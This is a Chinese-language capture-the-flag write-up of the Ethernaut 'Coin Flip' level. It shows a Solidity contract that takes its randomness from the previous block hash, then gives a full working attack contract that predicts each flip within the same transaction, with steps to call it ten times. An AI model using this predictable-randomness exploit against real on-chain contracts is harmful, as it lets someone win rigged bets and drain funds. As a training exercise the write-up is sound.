# Coin Flip
关于依赖于block hash的合约行为。
```solidity
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### 代码分析
1. 合约肯定不是通过人力来猜出结果，而是需要通过相同的逻辑来完成猜测
2. 编写攻击合约实现与该合约相同的逻辑，并在攻击合约中调用该合约的flip方法，
因为，整个流程为一条交易，所以他们获取的blockhash值肯定是一致的，即攻击合约
一定能够猜中。

### 攻击合约
[官方答案](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/attacks/CoinFlipAttack.sol)   
不导入CoinFlip合约
```solidity
pragma solidity ^0.4.18;


contract CoinFlipAttack {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(address _victim) public returns (bool) {
    address coinflip = _victim;
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinflip.call(bytes4(keccak256("flip(bool)")), side);
    return side;
  }
}
```
*bytes4(keccak256("flip(bool)"))*为合约调用方法的methodID

### 攻击方法
1. 部署攻击合约
2. 调用攻击合约attack(address)方法；（调用10次）